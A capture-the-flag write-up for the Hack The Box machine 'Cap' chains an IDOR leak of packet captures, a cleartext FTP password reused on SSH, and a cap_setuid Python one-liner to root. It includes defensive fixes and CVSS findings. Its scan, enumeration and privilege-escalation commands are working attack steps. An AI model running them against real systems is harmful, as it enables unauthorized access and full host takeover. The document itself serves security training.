# Hack The Box — Cap

| Field | Value |
|---|---|
| Platform | Hack The Box — Machines |
| Name | Cap |
| Difficulty | Easy |
| Category | Web (IDOR) / Linux privesc |
| OS | Linux |
| Date | 2026-11-07 |
| Tags | #idor #pcap #cleartext-creds #password-reuse #linux-capabilities #cap_setuid |

## TL;DR
> The web dashboard lets you download packet captures through a predictable, unauthenticated URL (`/data/<id>`) — an **IDOR**. Capture `0` holds a cleartext **FTP** session with the `nathan` account's credentials. That password is **reused on SSH**, giving a shell. Root falls to a **Linux capability**: `/usr/bin/python3.8` carries `cap_setuid`, so a one-liner elevates to UID 0.

---

## Recon

```bash
nmap -sC -sV 10.129.198.173 -oN nmap/initial
```

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn  (title: "Security Dashboard")
```

**What stands out.** Three services. FTP (21) and SSH (22) are credential-gated, so with nothing in hand the entry point has to be the web app on 80 — a "Security Dashboard" served by Gunicorn (a Python WSGI server, so likely a Flask/Django app). FTP and SSH are noted as *reuse targets* for any credential found later.

## Enumeration

### Web — Security Dashboard (port 80)

Browsing the dashboard, the interesting feature is **Security Snapshot**: it generates a network capture and, once done, redirects the browser to a URL of the form:

```
http://10.129.198.173/data/<id>
```

**The reasoning.** The `<id>` is a small sequential integer, and the path contains **no user identifier and no access check** — the application resolves a capture purely from the number in the URL. That is the textbook shape of an **IDOR** (Insecure Direct Object Reference): if the server trusts the id alone, I can read captures that aren't mine by walking the id down. My own snapshots came back as `/data/1`, `/data/2`… so the natural target is the earliest one:

```
http://10.129.198.173/data/0
```

`/data/0` is a capture generated before I ever connected — not mine, yet fully readable. It can be downloaded as a `.pcap`.

## Foothold / Initial access

### Cleartext credentials in the captured FTP session

Opening `0.pcap` (Wireshark → *Follow → TCP Stream* on the FTP conversation, or filter `ftp`), the login is in plaintext — FTP offers no transport encryption:

```
Request: USER nathan
Response: 331 Please specify the password.
Request: PASS Buck3t******        # redacted — recovered in full from the capture
Response: 230 Login successful.
```

So the capture yields a working credential pair for the user **`nathan`**.

### Password reuse → SSH

The recovered password is **reused on SSH** (port 22 from the initial scan). This is the real lesson of the foothold: a credential leaked from an insecure service (cleartext FTP) unlocks a hardened one.

```bash
ssh nathan@10.129.198.173
# password: (the one recovered from 0.pcap)
```

```bash
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ cat user.txt
HTB{REDACTED}
```

## Privilege escalation

With a shell as `nathan`, enumerate **Linux capabilities** — a privesc vector distinct from SUID:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid+ep
```

**The reasoning.** `cap_setuid` lets the binary change its own UID with no restriction. A SUID hunt (`find / -perm -4000`) would have missed this entirely — capabilities are a separate mechanism and need `getcap`. Python with `cap_setuid` is a known escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities)): call `os.setuid(0)` then spawn a shell.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt
HTB{REDACTED}
```

## Defender's view
> 📌 Root causes and prevention.

This box chains three independent misconfigurations; each is a separate fix.

- **IDOR on `/data/<id>` (root cause of the leak).** The endpoint must enforce authorization: a capture should be served only to the user who owns it (check the session's identity against the object's owner, and prefer non-enumerable identifiers such as UUIDs over sequential integers). Access control belongs on the object, not on the obscurity of the URL.
- **Cleartext FTP.** Credentials travelled in plaintext and were trivially recovered from a capture. Replace FTP with FTPS/SFTP so there is nothing to harvest even if traffic is captured.
- **Password reuse across services.** The same secret unlocked FTP and SSH. Enforce unique credentials per service and, for SSH, prefer key-based authentication and disable password login.
- **Over-privileged binary (`cap_setuid` on Python).** A general-purpose interpreter must never hold `cap_setuid`: any user who can run it becomes root. Remove the capability (`setcap -r /usr/bin/python3.8`) and grant the needed privilege to a narrowly scoped, audited helper instead. Audit regularly with `getcap -r /`.

Verification: `/data/<id>` of another user returns `403`; FTP control channel captured shows a TLS handshake, not `USER`/`PASS`; `getcap -r /` no longer lists `python3.8`.

## Lessons learned
- **`getcap -r /` belongs in every Linux privesc checklist**, right next to the SUID hunt. They are different mechanisms; relying on `find -perm -4000` alone would have left this box unsolved.
- An IDOR is often easier to spot by what the URL *lacks* (no owner, a guessable id) than by what it contains. "No user in the path" is a prompt to test, not a wall.
- Cleartext protocols are dangerous less for the single session than for the **credential reuse** they enable elsewhere — treat any plaintext credential as burned on every service.

## References
- OWASP — *Insecure Direct Object Reference (IDOR)* / Broken Access Control
- GTFOBins — [python capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
- `man capabilities(7)`, `man getcap`, `man setcap`

---

## Vulnerability detail

### F1 — Insecure Direct Object Reference exposing packet captures (`/data/<id>`)

| Field | Value |
|---|---|
| Severity | High *(CVSS 4.0 score to be verified — see link)* |
| CWE | CWE-639 — Authorization Bypass Through User-Controlled Key |
| Asset | `http://10.129.198.173/data/<id>` (port 80, Gunicorn) |
| CVSS 4.0 vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Calculator | first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N |

**Justification.** **PR:N / UI:N** — the capture is retrievable by a direct GET with no authentication and no interaction. **VC:H** — the exposed capture contains sensitive data, including cleartext credentials; **VI/VA:N** — read-only exposure. **SC/SI/SA:N** — scored on the direct exposure; the credential it leaks enables the SSH foothold, which is captured as the exploitation chain rather than inflated into the base score. A contributing factor is the **cleartext FTP** session itself (CWE-319), which is what made the captured credentials readable.

### F2 — Privilege escalation via `cap_setuid` on `/usr/bin/python3.8`

| Field | Value |
|---|---|
| Severity | High *(CVSS 4.0 score to be verified — see link)* |
| CWE | CWE-250 — Execution with Unnecessary Privileges |
| Asset | `10.129.198.173` — `/usr/bin/python3.8` (file capability `cap_setuid+ep`) |
| CVSS 4.0 vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Calculator | first.org/cvss/calculator/4.0#CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N |

**Justification.** **AV:L / PR:L** — requires an existing local shell (here, `nathan`). **VC:H/VI:H/VA:H** — `os.setuid(0)` yields full root, i.e. complete confidentiality, integrity and availability of the host. **SC/SI/SA:N** — impact is contained to this host.
